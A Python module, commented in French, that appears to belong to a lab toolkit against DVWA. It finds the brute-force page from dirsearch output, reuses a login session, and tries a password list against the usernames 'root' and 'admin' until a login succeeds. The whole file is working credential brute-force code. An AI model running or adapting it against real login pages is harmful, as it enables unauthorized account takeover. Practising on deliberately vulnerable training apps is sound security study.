from subprocess import Popen, PIPE
import requests
import sys
from bs4 import BeautifulSoup
from .dvwa_login_service import getDVWALogin
import os

def bruteForce():
    passwordList = "password_list.txt"
    file = open('dirsearch_output_test.txt', 'r')
    file_contents = file.readlines()
    address = ""
    sessID = getDVWALogin()['PHPSESSID']
    # Recherche de l'URL pour le brutforce
    for line in file_contents:
        address = line[13:].split(' ')[0].strip()
        if "brute" in address:
            print("Found the address of the brute page")
            url = address

    # Definition des listes de nom d'utilisateur et de mot de passe à essayer
    usernameList = {"root", "admin"}
    with open(passwordList) as passwords:
        passwords = passwords.readlines()

    # Début des boucles for des essais de login et definition d'un compteur pour l'affichage
    i = 1
    for password in passwords:
        for username in usernameList:
            password = password.rstrip('\n')
            # Execution de la tentative en cours
            response = bruteRequest(username, password, sessID, url)

            # Vérification de la reponse pour savoir si la combinaison est valide
            if('Welcome to the password protected area' in response):
                print("\n[✅] Found working credential ! \n\t Username: " + username + "\n\t Password: " + password)
                return True
            
            # Affichage de la tentative en cas d'échec à l'utilisateur
            print("[❌] [" + str(i) + "] Tried with U: " + username + " P: " + password)

            # Incrémentation du compteur pour l'affichage
            i += 1
    return False

def bruteRequest(username, password, sessID, url):
    # Ajout de la session ID pour l'authentification
    cookie = {
        "PHPSESSID": sessID,
        "security": "low"
    }

    # Listes des paramêtres de la requète Get
    getParams = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Envoie de la requètes avec les bons paramètres
    response = requests.get("{0}/".format(url), params=getParams, cookies=cookie, allow_redirects=False)

    # Verification du code HTTP de retour de la réponse 
    if response.status_code != 200:
        # Onaffiche le code erreur et on stop le programme
        print("\n[!] HTTP error code " + str(response.status_code))
        sys.exit(-1)
    
    # On retourne le text de la réponse
    return response.text

